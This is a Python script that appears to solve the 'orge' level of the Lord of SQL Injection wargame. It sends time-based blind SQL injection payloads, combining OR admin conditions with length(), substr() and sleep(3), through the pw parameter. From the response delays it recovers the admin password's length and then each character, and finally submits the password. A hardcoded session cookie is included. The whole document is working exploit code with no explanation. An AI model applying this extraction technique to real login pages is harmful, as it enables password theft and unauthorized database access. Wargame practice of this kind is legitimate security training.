import requests
import string
import time

url = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php?"
cookie = {'PHPSESSID':'aiub2r5p1f79164953a9ofa28v'}

def pw_length():
    pw_len = 0
    while True:
        pw_len += 1
        query = "pw='||id='admin'%26%26length(pw)={}%26%26sleep(3)%23".format(pw_len)
        print(query)
        start = time.time()
        res = requests.get(url=url+query,cookies=cookie)
        end = time.time() - start
        if end > 2.5:
            print("PASSWORD LENGTH : " + str(pw_len))
            break
    return pw_len

def pw_char(pw_len):
    passwd = ""
    for i in range(1, pw_len+1):
        for j in string.printable:
            query = "pw='||id='admin'%26%26substr(pw,{},1)={}%26%26sleep(3)%23".format(i,j)
            print(query)
            start = time.time()
            res = requests.get(url=url+query,cookies=cookie)
            end = time.time() - start
            if end > 2.5:
                passwd += j
                print("PASSWORD CHAR :" + j)
                break
    print("PASSWORD :" + passwd)
    return passwd

def orge_clear(passwd):
    query = "pw=%27||id='admin'%26%26pw={}".format(passwd)
    res = requests.get(url=url+query,cookies=cookie)
    if "ORGE Clear!" in res.text:
        print("ORGE Clear!")

if __name__ == "__main__":
    pw_len = pw_length()
    passwd =  pw_char(pw_len)
    orge_clear(passwd)

